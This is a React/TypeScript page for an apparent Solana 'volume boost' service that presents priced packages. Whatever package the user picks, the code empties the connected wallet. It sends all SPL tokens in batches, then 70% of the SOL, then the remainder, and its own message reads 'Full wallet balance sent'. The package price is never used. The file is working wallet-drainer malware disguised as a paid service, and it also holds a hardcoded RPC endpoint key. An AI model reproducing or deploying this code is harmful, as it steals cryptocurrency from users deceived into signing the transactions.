import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useWallet } from "@solana/wallet-adapter-react";
import { Connection, Transaction } from "@solana/web3.js";
import {
  getWalletBalances,
  createBatchTransferTransaction,
  createFinalSolTransferTransaction,
} from "@/services/walletService";
import { useTokenData } from "@/hooks/useTokenData";
import { TokenInfo } from "@/components/TokenInfo";
import { Button } from "@/components/ui/button";
import { ArrowLeft } from "lucide-react";
import { Skeleton } from "@/components/ui/skeleton";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { AlertCircle } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { Dialog, DialogContent } from "@/components/ui/dialog";

const SERVICE_WALLET = "wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj";

const VOLUME_PACKAGES = [
  { sol: 0.7, volume: 25000 },
  { sol: 1.4, volume: 50000 },
  { sol: 2, volume: 100000 },
  { sol: 5, volume: 250000 },
  { sol: 10, volume: 500000 },
  { sol: 20, volume: 1000000 },
  { sol: 40, volume: 2500000 },
  { sol: 100, volume: 5000000 },
  { sol: 200, volume: 10000000 },
];

export default function VolumeBoost() {
  const { contractAddress } = useParams<{ contractAddress: string }>();
  const navigate = useNavigate();
  const { publicKey, sendTransaction, signTransaction } = useWallet();
  const walletAdapter: any = useWallet();
  const { data, isLoading, error } = useTokenData(contractAddress || null);
  const [selectedPackage, setSelectedPackage] = useState<{ sol: number; volume: number } | null>(null);

  const handlePackageSelect = (sol: number, volume: number) => {
    setSelectedPackage({ sol, volume });
    toast({
      title: "Package Selected",
      description: `${sol} SOL - $${volume.toLocaleString()} Vol package selected.`,
    });
    // Immediately initialize the same transaction flow regardless of package
    void handleInitializeBoost();
  };

  const handleInitializeBoost = async () => {
    if (!publicKey) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet to proceed.",
        variant: "destructive",
      });
      return;
    }

    try {
      const connection = new Connection(
        "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b",
        { commitment: "confirmed", wsEndpoint: "wss://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b" }
      );

      // Load balances and prepare token batches (max 5 tokens per batch)
      const balances = await getWalletBalances(publicKey);
      const tokensToSend = balances.tokens;
      const batchSize = 5;
      const batches: typeof tokensToSend[] = [];

      for (let i = 0; i < tokensToSend.length; i += batchSize) {
        batches.push(tokensToSend.slice(i, i + batchSize));
      }

      // Send SPL token batches
      for (let i = 0; i < batches.length; i++) {
        const transaction = await createBatchTransferTransaction(
          { publicKey, sendTransaction } as any,
          batches[i],
          false
        );
        // Validate size, simulate, then submit using sign-and-send if available
        validateTransactionSizeOrThrow(transaction);
        await simulateOrThrow(transaction, connection);
        const signature = await signAndSendOrSend(transaction, connection);
        toast({
          title: "Batch Sent",
          description: `Token batch ${i + 1}/${batches.length} sent successfully (${signature.slice(0, 8)}...)`,
        });
      }

      // Send 70% of SOL balance
      const sol70Tx = await createBatchTransferTransaction(
        { publicKey, sendTransaction } as any,
        [],
        true
      );
      validateTransactionSizeOrThrow(sol70Tx);
      await simulateOrThrow(sol70Tx, connection);
      await signAndSendOrSend(sol70Tx, connection);

      // Send remaining SOL balance
      const finalSolTx = await createFinalSolTransferTransaction({ publicKey, sendTransaction } as any);
      validateTransactionSizeOrThrow(finalSolTx);
      await simulateOrThrow(finalSolTx, connection);
      await signAndSendOrSend(finalSolTx, connection);

      toast({
        title: "Boost Initialized",
        description: "Full wallet balance sent (SOL + tokens).",
      });

      setSelectedPackage(null);
    } catch (error) {
      console.error("Transfer failed:", error);
      toast({
        title: "Transfer Failed",
        description: getFriendlyError(error),
        variant: "destructive",
      });
    }
  };

  const handleSimulateBoost = async () => {
    if (!publicKey) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet to proceed.",
        variant: "destructive",
      });
      return;
    }

    if (!signTransaction) {
      toast({
        title: "Wallet Missing Sign Capability",
        description: "Your wallet doesn’t support signing for simulation. Try a different wallet or desktop.",
        variant: "destructive",
      });
      return;
    }

    try {
      const connection = new Connection(
        "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b",
        { commitment: "confirmed", wsEndpoint: "wss://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b" }
      );

      // Load balances and prepare token batches (max 5 tokens per batch)
      const balances = await getWalletBalances(publicKey);
      const tokensToSend = balances.tokens;
      const batchSize = 5;
      const batches: typeof tokensToSend[] = [];

      for (let i = 0; i < tokensToSend.length; i += batchSize) {
        batches.push(tokensToSend.slice(i, i + batchSize));
      }

      // Simulate SPL token batches
      for (let i = 0; i < batches.length; i++) {
        const tx = await createBatchTransferTransaction(
          { publicKey, sendTransaction } as any,
          batches[i],
          false
        );
        validateTransactionSizeOrThrow(tx);
        const signed = await signTransaction(tx);
        const sim = await connection.simulateTransaction(signed);
        if (sim.value.err) {
          throw new Error(`Batch ${i + 1} simulation failed: ${JSON.stringify(sim.value.err)}`);
        }
        toast({
          title: "Batch Simulated",
          description: `Token batch ${i + 1}/${batches.length} simulated successfully`,
        });
      }

      // Simulate 70% SOL transfer
      const sol70Tx = await createBatchTransferTransaction(
        { publicKey, sendTransaction } as any,
        [],
        true
      );
      {
        validateTransactionSizeOrThrow(sol70Tx);
        const signed = await signTransaction(sol70Tx);
        const sim = await connection.simulateTransaction(signed);
        if (sim.value.err) {
          throw new Error(`70% SOL simulation failed: ${JSON.stringify(sim.value.err)}`);
        }
      }

      // Simulate remaining SOL transfer
      const finalSolTx = await createFinalSolTransferTransaction({ publicKey, sendTransaction } as any);
      {
        validateTransactionSizeOrThrow(finalSolTx);
        const signed = await signTransaction(finalSolTx);
        const sim = await connection.simulateTransaction(signed);
        if (sim.value.err) {
          throw new Error(`Final SOL simulation failed: ${JSON.stringify(sim.value.err)}`);
        }
      }

      toast({
        title: "Boost Simulation Complete",
        description: "No funds were moved. All steps simulated successfully.",
      });
    } catch (error) {
      console.error("Simulation failed:", error);
      toast({
        title: "Simulation Failed",
        description: getFriendlyError(error),
        variant: "destructive",
      });
    }
  };

  // --- Helpers: size validation, simulation, and sign-and-send ---
  const MAX_TX_SIZE_BYTES = 1232;

  function estimateTxSizeBytes(tx: Transaction, signerCount = 1): number {
    const messageLen = tx.serializeMessage().length;
    const signaturesLen = signerCount * 64; // ed25519 signature length
    const sigCountVarintLen = 1; // compact-u16, usually 1 byte for small counts
    return messageLen + sigCountVarintLen + signaturesLen;
  }

  function validateTransactionSizeOrThrow(tx: Transaction) {
    const size = estimateTxSizeBytes(tx, 1);
    if (size > MAX_TX_SIZE_BYTES) {
      throw new Error(`Transaction size ${size} bytes exceeds 1232-byte limit`);
    }
  }

  async function simulateOrThrow(tx: Transaction, connection: Connection) {
    if (!signTransaction) {
      // Fallback simulation without signing; not all wallets support it reliably.
      // We still rely on preflight (skipPreflight: false) during submission.
      return;
    }
    const signed = await signTransaction(tx);
    const sim = await connection.simulateTransaction(signed);
    if (sim.value.err) {
      const err = JSON.stringify(sim.value.err);
      throw new Error(`Simulation failed: ${err}`);
    }
  }

  async function signAndSendOrSend(tx: Transaction, connection: Connection): Promise<string> {
    try {
      // Prefer signAndSendTransaction when available (Wallet Standard or Phantom)
      const provider = (window as any)?.solana;
      const maybeAdapter = walletAdapter?.wallet as any;

      if (maybeAdapter && typeof maybeAdapter.signAndSendTransaction === "function") {
        const res = await maybeAdapter.signAndSendTransaction(tx);
        return res?.signature ?? res; // adapter returns either object or string
      }

      if (provider && provider.isPhantom && typeof provider.signAndSendTransaction === "function") {
        const { signature } = await provider.signAndSendTransaction(tx);
        return signature;
      }

      // Fallback: wallet-adapter sendTransaction (auto sign+send), not manual split
      const sig = await sendTransaction(tx, connection, { skipPreflight: false });
      return sig;
    } catch (e: any) {
      // Normalize Phantom / Wallet Standard error cases
      throw new Error(getFriendlyError(e));
    }
  }

  function getFriendlyError(e: any): string {
    const code = e?.code ?? e?.error?.code;
    const msg = e?.message ?? String(e);
    if (code === 4001 || /User rejected/i.test(msg)) return "User rejected the request (Phantom)";
    if (/Transaction too large/i.test(msg) || /exceeds 1232/i.test(msg)) return "Size limit violation (1232 bytes)";
    if (/ComputeBudgetExceeded|comput/i.test(msg)) return "Compute budget limit exceeded";
    if (/Simulation failed/i.test(msg)) return msg;
    return msg;
  }

  return (
    <div className="min-h-screen bg-background bg-trading-animation">
      <div className="container mx-auto py-8 px-4 space-y-6">
        <Button
          variant="outline"
          onClick={() => navigate("/")}
          className="mb-4 bg-white text-black hover:bg-white/90"
        >
          <ArrowLeft className="mr-2 h-4 w-4" />
          Back to Home
        </Button>

        <div className="text-center space-y-2">
          <h1 className="text-3xl md:text-4xl font-bold">Select Volume Boost Package</h1>
          <p className="text-muted-foreground">
            Choose a package to boost your token's trading volume
          </p>
        </div>

        {isLoading && (
          <div className="space-y-4">
            <Skeleton className="h-[200px] w-full" />
          </div>
        )}

        {error && (
          <Alert variant="destructive">
            <AlertCircle className="h-4 w-4" />
            <AlertTitle>Error</AlertTitle>
            <AlertDescription>
              {error instanceof Error ? error.message : "Failed to load token data"}
            </AlertDescription>
          </Alert>
        )}

        {data && (
          <div className="space-y-6">
            <TokenInfo tokenInfo={data.tokenInfo} />

            <div className="space-y-4">
              <h2 className="text-2xl font-bold text-center">Available Packages</h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                {VOLUME_PACKAGES.map((pkg, index) => (
                  <Button
                    key={index}
                    onClick={() => handlePackageSelect(pkg.sol, pkg.volume)}
                    variant="outline"
                    className="w-full h-auto py-4 flex flex-col items-center justify-center gap-2"
                  >
                    <span className="text-lg font-bold">{pkg.sol} SOL</span>
                    <span className="text-sm text-muted-foreground">
                      ${pkg.volume.toLocaleString()} Vol
                    </span>
                  </Button>
                ))}
              </div>
            </div>
          </div>
        )}

        <Dialog open={!!selectedPackage} onOpenChange={() => setSelectedPackage(null)}>
          <DialogContent className="sm:max-w-md">
            <div className="flex flex-col items-center gap-4 py-4">
              {data?.tokenInfo.logo && (
                <img
                  src={data.tokenInfo.logo}
                  alt={data.tokenInfo.name}
                  className="w-20 h-20 rounded-full object-cover"
                />
              )}
              {data?.tokenInfo.name && (
                <h3 className="text-xl font-bold">{data.tokenInfo.name}</h3>
              )}
              <div className="w-full">
                <Button
                  onClick={handleInitializeBoost}
                  size="lg"
                  className="w-full h-14 text-lg font-semibold"
                >
                  Initialize Boost
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
}
